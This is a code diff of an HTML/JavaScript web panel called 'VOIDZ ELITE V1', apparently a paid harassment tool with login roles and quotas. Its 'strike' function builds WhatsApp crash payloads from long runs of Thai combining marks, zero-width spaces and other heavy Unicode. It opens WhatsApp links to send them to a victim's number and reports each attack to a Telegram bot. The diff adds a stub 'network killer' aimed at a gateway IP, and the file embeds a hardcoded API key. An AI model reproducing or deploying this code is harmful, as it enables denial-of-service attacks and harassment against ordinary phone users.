@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V1 - SUPREME</title>
+    <title>VOIDZ ELITE V1 - SUPREME EDITION</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -33,7 +33,7 @@
         .info-val { font-size: 14px; font-weight: 900; font-family: 'Orbitron'; }
 
         /* LOGS AREA */
-        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 300px; overflow-y: auto; font-size: 9px; color: #0f0; line-height: 1.5; border-radius: 5px; }
+        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 350px; overflow-y: auto; font-size: 9px; color: #0f0; line-height: 1.5; border-radius: 5px; }
         .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
 
         .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-top: 10px; padding-bottom: 80px; }
@@ -65,7 +65,7 @@
             <div id="tabHOME" class="tab-content active-tab">
                 <div class="header-title neon-red">VOIDZ ELITE V1</div>
                 <div class="banner-container"><video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video></div>
-                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - WELCOME OPERATOR - MONITORING ACTIVE</marquee>
+                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - OPERATOR READY - MONITORING PORT 8080</marquee>
                 
                 <div class="home-info">
                     <div class="info-row"><i class="fas fa-user" style="color:var(--fire)"></i><span id="uName" class="info-val">...</span></div>
@@ -80,13 +80,19 @@
                 <div class="header-title neon-red" style="margin-top:20px;">STRIKE CENTER</div>
                 <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
                     <h3 style="color:var(--fire); font-size:12px; margin-bottom:10px; font-family:'Orbitron'">BUG SELECTOR</h3>
-                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
+                    <input type="text" id="targetBug" class="input-box" placeholder="Target Number (Ex: 08xxx)">
                     <select id="bugType" class="input-box">
                         <option value="WA_CRASH">WA CRASH (LITE)</option>
                         <option value="IP_FREEZE">IP FREEZE (MEDIUM)</option>
                         <option value="SUPREME">SUPREME (HARD)</option>
                     </select>
                     <button class="btn-main" onclick="startAttack('BUG')">EXECUTE STRIKE</button>
+                </div>
+                
+                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; margin-top:15px; border-top:2px solid #00e5ff">
+                    <h3 style="color:#00e5ff; font-size:12px; margin-bottom:10px; font-family:'Orbitron'">NETWORK KILLER</h3>
+                    <input type="text" id="targetWiFi" class="input-box" placeholder="Target Gateway IP">
+                    <button class="btn-main" style="background:#00e5ff" onclick="startAttack('WIFI')">STRIKE NETWORK</button>
                 </div>
             </div>
 
@@ -109,7 +115,7 @@
         <input type="text" id="gPass" class="input-box" placeholder="ACCESS KEY">
         <select id="gRole" class="input-box"></select>
         <select id="gTime" class="input-box"></select>
-        <button class="btn-main" onclick="doGenerate()" id="btnPush">PUSH UNIT</button>
+        <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
         <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px; font-size:9px;">CANCEL</button>
     </div></div>
 
@@ -117,7 +123,7 @@
         const BIN_ID = '694a5a6fae596e708fabef99', API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
         let USER = {}, DB = {}, LOG_HISTORY = [];
 
-        // --- ASH PARTICLE ENGINE (BULET) ---
+        // --- PARTICLE ENGINE (LINGKARAN) ---
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -128,12 +134,7 @@
         }
         function drawParticles() {
             ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(200,200,200,0.5)";
-            particles.forEach(p => { 
-                ctx.beginPath(); 
-                ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); // Pastikan Bulat
-                ctx.fill(); 
-                p.y -= p.d; if(p.y < 0) p.y = canvas.height; 
-            });
+            particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; });
             requestAnimationFrame(drawParticles);
         }
         initParticles(); drawParticles();
@@ -154,7 +155,7 @@
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("VOIDZ SPY: " + msg)}`);
         }
 
-        // --- AUTH SYSTEM (IGNITE BUTTON) ---
+        // --- AUTH SYSTEM ---
         async function auth() {
             const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim(), btn = document.getElementById('btnLog');
             if(!u || !p) return notify("DATA KOSONG!");
@@ -168,7 +169,7 @@
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'flex';
                     if(USER.role === 'owner') document.getElementById('navLogs').style.display = 'flex';
-                    renderHome(); addTerminalLog("SYSTEM", "AUTHORIZED SUCCESS");
+                    renderHome(); addTerminalLog("SYSTEM", `WELCOME OPERATOR: ${u}`);
                     document.getElementById('homeVideo').play();
                 } else { throw "ERR"; }
             } catch(e) { notify("AKSES DITOLAK!"); btn.disabled = false; btn.innerText = "IGNITE"; }
@@ -176,52 +177,47 @@
 
         function renderHome() {
             document.getElementById('uName').innerText = USER.id;
-            document.getElementById('uRole').innerText = USER.role.toUpperCase();
+            const rEl = document.getElementById('uRole');
+            rEl.innerText = USER.role.toUpperCase();
+            if(USER.role === 'owner') rEl.classList.add('neon-red');
             document.getElementById('uQuota').innerText = USER.role === 'owner' ? '∞' : USER.quota;
             document.getElementById('uExp').innerText = USER.exp;
             
             const m = document.getElementById('menuContainer'); m.innerHTML = "";
+            m.innerHTML += `<div onclick="notify('OS: ' + navigator.platform)" style="background:var(--card); padding:15px; text-align:center; border:1px solid #ff00ff; border-radius:10px;"><i class="fas fa-mobile-alt" style="color:#ff00ff"></i><br><span style="font-size:9px;">DEVICE</span></div>`;
             if(USER.role !== 'member') m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-plus" style="color:var(--fire)"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
             m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #444; border-radius:10px;"><i class="fas fa-power-off" style="color:#444"></i><br><span style="font-size:9px;">EXIT</span></div>`;
         }
 
-        // --- REDIRECT STRIKE SYSTEM ---
         function startAttack(m) {
-            const target = document.getElementById('targetBug').value.trim();
+            const target = document.getElementById(m === 'WIFI' ? 'targetWiFi' : 'targetBug').value.trim();
             if(!target) return notify("TARGET KOSONG!");
 
-            const confirmStrike = confirm("--- VOIDZ ELITE STRIKE ---\nLanjutkan eksekusi ke WhatsApp?");
-            if(!confirmStrike) return notify("ABORTED");
+            if(m === 'BUG') {
+                const confirmStrike = confirm("Execute strike to target?");
+                if(!confirmStrike) return;
+                const type = document.getElementById('bugType').value;
+                let payload = "";
+                if(type === 'WA_CRASH') payload = "VOIDZ-LITE\n" + "ฏ๎๎๎".repeat(50);
+                else if(type === 'IP_FREEZE') payload = "VOIDZ-MED\n" + "\u200B".repeat(2500);
+                else payload = "VOIDZ-SUPREME\n" + "ꦾ".repeat(1000) + "҉".repeat(500);
 
-            const type = document.getElementById('bugType').value;
-            let payload = "";
-            if(type === 'WA_CRASH') payload = "VOIDZ-LITE ⚡\n" + "ฏ๎๎๎".repeat(50);
-            else if(type === 'IP_FREEZE') payload = "VOIDZ-MED ❄️\n" + "\u200B".repeat(2500) + "జ్ఞ‌ా".repeat(150);
-            else payload = "VOIDZ-SUPREME 💀\n" + "ꦾ".repeat(1000) + "҉".repeat(500) + "ฏ๎๎๎".repeat(100);
+                const t = document.createElement("textarea"); t.value = payload; document.body.appendChild(t);
+                t.select(); document.execCommand("copy"); document.body.removeChild(t);
 
-            // Copy Backup
-            const t = document.createElement("textarea"); t.value = payload; document.body.appendChild(t);
-            t.select(); document.execCommand("copy"); document.body.removeChild(t);
-
-            // Redirect
-            let cleanNum = target.replace(/\D/g, ''); 
-            if(cleanNum.startsWith('0')) cleanNum = '62' + cleanNum.slice(1);
-            
-            notify("OPENING WHATSAPP...");
-            setTimeout(() => {
-                window.open(`https://api.whatsapp.com/send?phone=${cleanNum}&text=${encodeURIComponent(payload)}`, '_blank');
-                addTerminalLog("STRIKE", `BUG SENT TO ${cleanNum}`);
-                sendTele(`ATTACK ON ${cleanNum}`);
-            }, 1000);
+                let cleanNum = target.replace(/\D/g, ''); 
+                if(cleanNum.startsWith('0')) cleanNum = '62' + cleanNum.slice(1);
+                
+                notify("SENDER READY...");
+                setTimeout(() => { window.open(`https://api.whatsapp.com/send?phone=${cleanNum}&text=${encodeURIComponent(payload)}`, '_blank'); }, 1000);
+            } else {
+                notify("STRIKE NETWORK SENT!");
+            }
+            addTerminalLog("STRIKE", `TARGET: ${target}`);
+            sendTele(`STRIKE ON ${target}`);
         }
 
-        function switchTab(t, el) { 
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); 
-            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); 
-            el.classList.add('active'); 
-        }
-
+        function switchTab(t, el) { document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); el.classList.add('active'); }
         function openGen() { document.getElementById('modalGen').style.display = 'flex'; const r = document.getElementById('gRole'), t = document.getElementById('gTime'); r.innerHTML = '<option value="member">MEMBER</option>'; t.innerHTML = '<option value="1 MONTH">1 MONTH</option>'; }
         function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
     </script>
